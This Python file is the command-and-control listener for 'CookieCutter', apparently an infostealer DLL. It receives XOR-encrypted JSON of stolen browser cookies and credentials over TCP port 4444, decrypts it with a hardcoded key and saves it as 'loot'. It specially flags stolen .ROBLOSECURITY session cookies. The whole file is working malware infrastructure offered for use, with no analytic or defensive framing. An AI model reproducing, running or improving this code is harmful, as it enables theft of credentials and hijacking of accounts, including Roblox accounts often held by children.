#!/usr/bin/env python3
#=============================================================================
#  listener.py — CookieCutter TCP C2 Receiver
#  Listens for incoming harvest payloads from cookiecutter.dll ExfilTCP().
#  Since target users have firewall OFF, this is a highly reliable path.
#
#  Usage:
#    python listener.py [--host 0.0.0.0] [--port 4444] [--output ./loot/]
#
#  Protocol:
#    [4-byte BE length][XOR-encrypted JSON payload]
#    XOR key: "cookiecutter_LO!" (16 bytes)
#=============================================================================

import socket
import struct
import sys
import os
import json
from datetime import datetime
from pathlib import Path

XOR_KEY = b"cookiecutter_LO!"
OUTPUT_DIR = Path("./loot")

def xor_decrypt(data: bytes, key: bytes) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def handle_client(conn: socket.socket, addr: tuple):
    print(f"\n[*] Connection from {addr[0]}:{addr[1]}")
    conn.settimeout(30)

    try:
        # Read 4-byte length prefix
        header = b""
        while len(header) < 4:
            chunk = conn.recv(4 - len(header))
            if not chunk:
                break
            header += chunk
        
        if len(header) < 4:
            print("[!] Short header")
            return

        payload_len = struct.unpack(">I", header)[0]
        print(f"[*] Expecting {payload_len} bytes")

        if payload_len > 50 * 1024 * 1024:  # 50MB sanity cap
            print("[!] Payload too large, dropping")
            return

        # Read payload
        data = b""
        while len(data) < payload_len:
            chunk = conn.recv(min(payload_len - len(data), 65536))
            if not chunk:
                break
            data += chunk

        if len(data) < payload_len:
            print(f"[!] Short payload: got {len(data)}/{payload_len}")
            return

        # Decrypt
        decrypted = xor_decrypt(data, XOR_KEY)

        # Parse JSON
        try:
            parsed = json.loads(decrypted.decode("utf-8", errors="replace"))
        except json.JSONDecodeError as e:
            print(f"[!] JSON parse error: {e}")
            # Save raw anyway
            OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            raw_path = OUTPUT_DIR / f"raw_{ts}_{addr[0]}.bin"
            raw_path.write_bytes(decrypted)
            print(f"[*] Raw saved to {raw_path}")
            return

        # Save
        OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_path = OUTPUT_DIR / f"harvest_{ts}_{addr[0]}.json"
        out_path.write_text(json.dumps(parsed, indent=2), encoding="utf-8")

        # Summary
        cookies_count = len(parsed.get("cookies", []))
        creds_count = len(parsed.get("credentials", []))
        print(f"[+] Saved to {out_path}")
        print(f"[+] Summary: {cookies_count} cookies, {creds_count} credentials")

        # Print .ROBLOSECURITY if present
        if "cookies" in parsed:
            for c in parsed["cookies"]:
                if ".ROBLOSECURITY" in c.get("name", ""):
                    print(f"[!!!] .ROBLOSECURITY found: {c['value'][:60]}...")
                    break

    except socket.timeout:
        print("[!] Timeout")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        conn.close()

def main():
    import argparse
    parser = argparse.ArgumentParser(description="CookieCutter TCP C2 Listener")
    parser.add_argument("--host", default="0.0.0.0", help="Bind address")
    parser.add_argument("--port", type=int, default=4444, help="Bind port")
    parser.add_argument("--output", default="./loot", help="Output directory")
    args = parser.parse_args()

    global OUTPUT_DIR
    OUTPUT_DIR = Path(args.output)
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    print(f"""
╔══════════════════════════════════════════╗
║       🍪 CookieCutter C2 Listener        ║
║       Listening on {args.host}:{args.port:<5}          ║
║       Output: {str(OUTPUT_DIR):<26} ║
╚══════════════════════════════════════════╝
""")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((args.host, args.port))
    sock.listen(5)

    try:
        while True:
            conn, addr = sock.accept()
            handle_client(conn, addr)
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
